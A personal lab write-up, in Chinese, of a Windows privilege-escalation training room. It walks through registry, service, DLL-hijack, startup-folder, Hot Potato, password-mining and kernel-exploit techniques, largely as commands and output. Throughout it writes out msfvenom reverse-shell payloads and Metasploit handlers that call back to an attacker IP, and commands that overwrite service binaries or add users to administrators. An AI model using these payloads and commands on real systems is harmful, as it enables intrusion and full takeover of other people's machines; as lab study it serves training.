# Windows PrivEsc Arena




**RDP**
```
kali 10.18.1.192

----------------------------
username: user
password: password321

username: TCM
password: Hacker123
```


```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.159.162
xfreerdp /u:TCM /p:Hacker123 /cert:ignore /v:10.10.159.162
```


**查詢所有使用者**
```
C:\Users\user>net user

Administrator            Guest                    TCM
user
The command completed successfully.
```




## 註冊表升級 - 自動運行



**Autoruns64.exe 是一個用於查看和管理 Windows 啟動項目的工具**

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe 
```

* 點選 "Logon" 項目通常涉及在使用者登入系統時自動啟動的程序


**找到自動啟動的程序**
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	
c:\program files\autorun program\program.exe	
```


**查看目錄權限**
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program" 
```

**顯示**
```
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

* 請注意「Everyone」使用者群組有FILE_ALL_ACCESS，對文件或目錄有完全的控制權

**msf meterpreter handler**
```
msfconsole
use multi/handler
set Payload windows/meterpreter/reverse_tcp 
set lhost 10.18.1.192
run
```


**產生 reverse shell  為 program.exe**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.18.1.192 lport=4444 -f exe -o program.exe

```


**kali 建立 smbserver**
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

**下載強制覆蓋**
```
copy /Y \\10.18.1.192\kali\program.exe "C:\Program Files\Autorun Program\program.exe"
```


**拿到TCM權限**

```
meterpreter > getuid
Server username: TCM-PC\TCM
```

---



## 註冊表升級 - AlwaysInstallElevated


**查詢登錄中的 AlwaysInstallElevated 金鑰：**
用于配置 Windows Installer 的安装行为。具体来说，当该注册表项被启用时，普通用户在安装 MSI 包时会以管理员权限进行安装，而不需要管理员的明确授权。

* AlwaysInstallElevated 存在并被设置为 1
那么 Windows Installer 会以管理员权限执行所有的 MSI 安装


* HKCU 的修改会影响当前用户，而对 HKLM 的修改会影响整个系统

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
//AlwaysInstallElevated    REG_DWORD    0x1


reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
//AlwaysInstallElevated    REG_DWORD    0x1
```





**產生 reverse shell  為 setup.msi**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.18.1.192 lport=4444 - f msi -o setup.msi
```


**下載強制覆蓋**
```
copy /Y \\10.18.1.192\kali\setup.msi "C:\Temp\setup.msi"
```

**安裝**
```
msiexec /quiet /qn /i C:\Temp\setup.msi
```


**拿到SYSTEM**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

---


## 服務升級 - 註冊表


**檢查服務權限**
```
sc qc regsvc
```

```
SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecur
eregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

* SERVICE_START_NAME : LocalSystem



**ps 檢查regsvc服務 註冊表權限**
```
PS C:\Users\TCM>  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

**顯示**
```
Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentC
         ontrolSet\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
```


**請注意，輸出顯示屬於「NT AUTHORITY\INTERACTIVE」的使用者對登錄項目具有「FullContol」權限。**



**下載 reverse.exe**
```
copy /Y \\10.18.1.192\kali\program.exe "C:\temp\reverse.exe"
```

**修改註冊表 ImagePath**
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\reverse.exe /f
```

**啟動服務**
```
sc start regsvc
```

**拿system**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
---

### 服務升級 - 可執行文件

**檢查filepermsvc配置**
```
sc qc filepermsvc
```


```
SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\fileperm
service.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user>
```



**檢查目錄權限**
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

```

```
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

```

* 請注意，Everyone使用者群組具有 FILE_ALL_ACCESS 權限。
 
 
**覆蓋**
```
copy /y C:\temp\reverse.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```

**啟動服務**
```
sc start filepermsvc
```

**拿system**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 權限提升 - 啟動應用程式



```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

```
BUILTIN\Users:(F)
TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
Everyone:(I)(OI)(CI)(RX)

BUILTIN\Users 具有完全控制权限（F）。
TCM-PC\TCM 具有继承、对象继承和容器继承，以及删除和删除子项权限。
NT AUTHORITY\SYSTEM 具有继承、对象继承和容器继承，以及完全控制权限。
BUILTIN\Administrators 具有继承、对象继承和容器继承，以及完全控制权限。
BUILTIN\Users 具有继承、对象继承和容器继承，以及读取和执行权限。
Everyone 具有继承、对象继承和容器继承，以及读取和执行权限。

```

* 從輸出中註意到「BUILTIN\Users」群組具有完全存取權限「(F) ”到目錄。



**複製到Startup目錄**
```
copy /y C:\temp\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.exe"
```


**使用管理員帳戶憑證登入，拿shell**
```
meterpreter > getuid
Server username: TCM-PC\TCM

```


--- 


## 服務升級 - DLL 劫持

(這題我實驗失敗，但過程了解就可，由於我用跟官方用的payload 不一樣，我是用meterpreter，而不是 cmd 指令)

重點說明，dllsvc 服務會調用 C:\temp\hijackme.dll
但C:\temp\ 沒有找到hijackme.dll，所以調用失敗
我們發現這目錄可以寫入，所以就丟惡意的dll 進去。




sc qc dllsvc
```
SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservi
ce.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DLL Hijack Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```



### Process Monitor 可以幫我查看dllhijackservice.exe程式調用的過程，

**1. 開啟桌面上的 Tools 資料夾，然後前往 Process Monitor 資料夾。**

**2. 實際上，可執行檔會從受害者的主機複製到攻擊者的主機，以便在執行時進行分析。或者，可以在攻擊者的主機上安裝相同的軟體進行分析，以防他們獲得該軟體。若要模擬此過程，請右鍵單擊 Procmon.exe 並從選單中選擇“以管理員身份執行”。**


**3. 在procmon中，選擇「過濾器」。從最左側的下拉式選單中，選擇“進程名稱”。**

**4. 在同一行的輸入框中鍵入：dllhijackservice.exe**

**5. 確保該行顯示“進程名稱為dllhijackservice.exe，然後包含”，然後單擊“添加”按鈕，然後單擊“應用”，最後單擊“確定” '。**

**6. 接下來，從最左側的下拉式選單「結果」中選擇。**

**7. 在同一行的輸入框中輸入：NAME NOT FOUND **

**8. 確保該行顯示“Result is NAME NOT FOUND then Include”，然後按一下“新增”按鈕，然後按“套用”，最後按一下“確定” 。**

**9. 開啟命令提示字元並鍵入：sc start dllsvc**

**10. 捲動到視窗底部。反白的結果之一顯示該服務嘗試執行“C:\Temp\hijackme.dll”，但由於未找到該檔案而無法執行此操作。請注意，「C:\Temp」是可寫入位置。**



**我用了64位元的才成功**
```
msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f dll LHOST=10.18.1.192 LPORT=4444 > reverse_32bit.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=10.18.1.192 LPORT=4444 > reverse_64bit.dll
```

**複製到C:\temp\hijackme.dll**
```
copy /Y \\10.18.1.192\kali\reverse_64bit.dll "C:\temp\hijackme.dll"
```

**重啟服務**
```
sc stop dllsvc 
sc start dllsvc
```

**可以短暫的看到 meterpreter 有運作一下，但很快就斷了。(這靶場的很多服務不穩定，最好用官方payload)**
```
[*] Started reverse TCP handler on 10.18.1.192:4444 
[*] Sending stage (175686 bytes) to 10.10.159.162
[*]  - Meterpreter session 16 closed.  Reason: Died
```



--- 


## 服務升級 - binPath

**查看服務配置**
```
sc qc daclsvc
```

```
SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\temp\reverse.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```





**查看服務權限**
```
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

```
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```




* 請注意，輸出表示使用者「User-PC\User」具有「SERVICE_CHANGE_CONFIG」權限。




**修改 daclsvc binpath**
```
sc config daclsvc binpath= "C:\temp\reverse.exe"
```



**啟動服務**
```
sc start daclsvc
```




**拿system**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


--- 

## 服務升級 - 未加引號的服務路徑


**查看服務配置**
```
sc qc unquotedsvc
```

```
SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files
\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem


```

* BINARY_PATH_NAME 未加引號並包含空格
如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。


**查看目錄權限**
```
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuv "C:\Program Files\Unquoted Path Service\"
```


```
  RW BUILTIN\Users
        FILE_ALL_ACCESS
  RW NT SERVICE\TrustedInstaller
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

C:\Users\user>
```

*   RW BUILTIN\Users   FILE_ALL_ACCESS




**複製到目錄 命名為Common.exe**
```
copy /y C:\temp\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

**啟動服務**
```
sc start unquotedsvc
```

**拿system **
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

---




## 馬鈴薯升級 - 燙手山芋

### (原理有點複雜，之後再研究。)

**查看當前用戶組別**
```
whoami /groups
```

**檢查並沒有在 administrators 組裡**
```
GROUP INFORMATION
-----------------

Group Name                             
======================================
Everyone                               
TCM-PC\HomeUsers                       
BUILTIN\Remote Desktop Users           
BUILTIN\Users                          
NT AUTHORITY\REMOTE INTERACTIVE LOGON  
NT AUTHORITY\INTERACTIVE               
NT AUTHORITY\Authenticated Users       
NT AUTHORITY\This Organization         
LOCAL                                  
NT AUTHORITY\NTLM Authentication       
Mandatory Label\Medium Mandatory Level Label

```



**Hot Potato Exploitation**
```
0. 在命令提示字元中鍵入：powershell
1. 在powershell鍵入：powershell.exe -nop -epbypass
2. 在 Power Shell 提示字元中鍵入：Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1 
3. 在Power Shell提示符號中鍵入：Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add" 
4. 若要確認攻擊是否成功，請在 Power Shell 提示字元中鍵入：  net localgroup administrators
```


**成功加入administrators組**
```
PS C:\Users\user> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.

```




---


## 密碼挖掘升級 - 設定文件

### (這題基本沒用)

**这个文件包含了在 Windows 安装期间使用的设置和配置信息**
```
notepad C:\Windows\Panther\Unattend.xml
```


**找到**
```
<Password>
    <Value>cGFzc3dvcmQxMjM=</Value>
    <PlainText>false</PlainText>
</Password>
```


**base64 decode**
```
echo "cGFzc3dvcmQxMjM=" | base64 -d
//password123
```

---

## 密碼挖掘升級 - 內存


```
msfconsole
use auxiliary/server/capture/http_basic
set SRVHOST 10.18.1.192
set uripath x
run
```


**IE 開啟會彈出假的帳戶密碼輸入框。**
```
http://10.18.1.192/x
```



**注意題目的原意是，輸入後帳密後，dump IE進程然後再去提取，但他已經幫我們捕捉到了。**
```
msf6 auxiliary(server/capture/http_basic) > 
[*] Using URL: http://10.18.1.192/x
[*] Server started.
[*] Sending 401 to client 10.10.159.162
[+] HTTP Basic Auth LOGIN 10.10.159.162 "test123:test456" / /x

```

* 我看到網上有失敗的例子，所以就不嘗試了，而且在實際案例也有點不合適，dump 出來92MB 太大了。太容易被發現。


---


## 權限提升 - 核心漏洞


**msf handler**
```
msfconsole
use multi/handler
set Payload windows/meterpreter/reverse_tcp
set lhost 10.18.1.192
run
```


**產生檔案 shell.exe **
```
msfvenom -p windows/x64 /meterpreter/reverse_tcp lhost=10.18.1.192 -f exe > shell.exe
```

**先複製執行產生shell**
```
copy /Y \\10.18.1.192\kali\program.exe "C:\temp\shell.exe"
```


**meterpreter**
```
run post/multi/recon/local_exploit_suggester
```

```
 1   exploit/windows/local/always_install_elevated     Yes   The target is vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr          Yes   The target appears to be vulnerable.
 3   exploit/windows/local/ikeext_service              Yes   The target appears to be vulnerable.
 4   exploit/windows/local/ms10_092_schelevator        Yes   The target appears to be vulnerable.
 5   exploit/windows/local/ms13_053_schlamperei        Yes   The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu   Yes   The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu   Yes   The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image  Yes   The target appears to be vulnerable.
 9   exploit/windows/local/ntusermndragover            Yes   The target appears to be vulnerable.
 10  exploit/windows/local/ppr_flatten_rec             Yes   The target appears to be vulnerable.
 11  exploit/windows/local/tokenmagic                  Yes   The target appears to be vulnerable. 
```


**我試了很多 只有一個可以用，所以 post/multi/recon/local_exploit_suggester 誤報率很高**
```
use exploit/windows/local/tokenmagic

set sessions 1
set lhost 10.18.1.192
run
```

* 這個exploit 不好，會跳出帳密輸入框。很明顯


---

### 整體來說，這個靶場不好玩，太多錯誤。(不過現實錯誤更多!!!)